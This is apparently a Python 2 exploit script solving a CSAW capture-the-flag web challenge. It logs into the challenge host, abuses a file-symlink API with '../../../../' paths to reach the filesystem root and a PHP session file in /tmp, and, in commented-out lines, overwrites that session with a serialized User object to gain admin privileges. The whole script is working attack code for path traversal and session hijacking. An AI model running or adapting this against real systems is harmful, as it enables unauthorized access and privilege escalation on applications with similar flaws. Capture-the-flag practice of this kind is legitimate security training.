import requests
import sys
import json

r = requests.Session()
api="http://web.chal.csaw.io:8007/"

# Register
data={"username":"1gimme", "password":"justgimme"}

r1 = r.post(api+"login", data=data)
print r1.text
print "Logged In"

# Try upload file

#path=1.txt&content=VTJGc2RHVmtYMTlnS2NJSmJYb1NOdVNGcUNaN2xkc0tpendLcWJpcUNYMD0%3D

r1 = r.post(api+"api/v1/file/edit", data={"path":"1.txt","content":"VTJGc2RHVmtYMTlnS2NJSmJYb1NOdVNGcUNaN2xkc0tpendLcWJpcUNYMD0="})
if "ok" in r1.text:
	print "Uploading Phase successful"

# Symlink
r1 = r.post(api+"api/v1/file/symlink", data={"path":"root", "target":"../../../../"})
if "ok" in r1.text:
	print "Symlinked Successfully"

mycookie = r.cookies.get_dict()
bcmc= mycookie['PHPSESSID']

sess_id ="4umud1lupqn0mpibor27r283o1"
r1 = r.post(api+"api/v1/file/symlink", data={"path":"lolz1", "target":"../../../../tmp/sess_"+sess_id})
if "ok" in r1.text:
	print "Symlinked Session"

# Confirming symlink
r1 = r.post(api+"api/v1/file/read", data={"path":"lolz1"})
if "current" in r1.text:
	print r1.text

# Overwriting session to admin privileges
#print "Trying to become admin by overwriting session"
#data={'path':'lolz1','content':'current_user|O:4:"User":4:{s:8:"username";s:6:"1gimme";s:8:"password";s:60:"$2y$10$m8b4/o/YiVluA5ziNH2oD.dDBoPP.EuEb3eF9jgyjEOudOnQI3paG";s:5:"privs";s:2:"15";s:2:"id";s:1:"3";}'}
#r1 = r.post(api+"api/v1/file/edit", data=data)
#print r1.text
print "Now you are admin, dont run script again, just use this session id for further test "+bcmc
